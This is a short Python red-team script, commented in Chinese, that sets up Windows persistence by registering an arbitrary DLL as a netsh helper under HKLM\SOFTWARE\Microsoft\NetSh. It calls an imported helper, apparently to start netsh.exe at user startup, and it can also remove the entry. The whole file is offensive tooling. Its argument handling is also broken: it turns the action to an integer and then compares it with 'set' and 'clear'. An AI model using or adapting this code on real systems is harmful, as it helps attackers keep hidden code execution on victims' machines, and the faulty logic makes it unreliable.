#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020.02.05
# @Author  : Lhaihai
# @File    : netsh
# @Software: PyCharm
# @Blog    : http://www.Lhaihai.top
"""
    Description : Netsh是Windows实用程序，管理员可以使用它来执行与系统的网络配置有关的任务，并在基于主机的Windows防火墙上进行修改。可以通过使用DLL文件来扩展Netsh功能。此功能使红队可以使用此工具来加载任意DLL，以实现代码执行并因此实现持久性。但是，此技术的实现需要本地管理员级别的特权。
"""

import pyregedit.pyregedit as pyregedit
from logger import factory_logger
logger = factory_logger('NetSh')
from startup import set_user,clear_user
import sys,os

def init():
    root = pyregedit.HKEY_LOCAL_MACHINE
    path = r"SOFTWARE\Microsoft\NetSh"
    reg = pyregedit.RegEdit(root,path)
    return reg

def set_NetSh(cmd):
    reg = init()

    if reg.check_key():
        try:
            value_name = str(cmd).split('\\')[-1].split('.')[0]
            reg.create_value(value_name, pyregedit.REG_SZ, cmd)
            set_user(r'netsh.exe')
            logger.info('插入注册表成功')
        except:
            logger.error('插入注册表失败')
    else:
        logger.info('需要管理员权限！')
        return



def clear_NetSh(cmd):
    reg = init()
    #判断键是否存在
    if reg.check_key():
        value_name = str(cmd).split('\\')[-1].split('.')[0]
        reg.delete_value(value_name)
        clear_user()
        logger.info('清除')
    else:
        logger.info('需要管理员权限！')
        return

if __name__ == '__main__':
    action = int(sys.argv[1]) if len(sys.argv) > 1 else ''
    cmd = sys.argv[2] if len(sys.argv) > 2 else ''
    if action == 'set' and cmd:
        if ':' not in cmd and '\\' not in cmd:
            path = os.getcwd() + '\\' + cmd
            if os.path.exists(path):
                set_NetSh(path)
            else:
                logger.error(cmd + '文件不存在')
        else:
            set_NetSh(cmd)
    elif action == 'clear' and cmd:
        clear_NetSh(cmd)
    else:
        print("NetSh.exe set 64.dll")
        print("NetSh.exe clear 64.dll")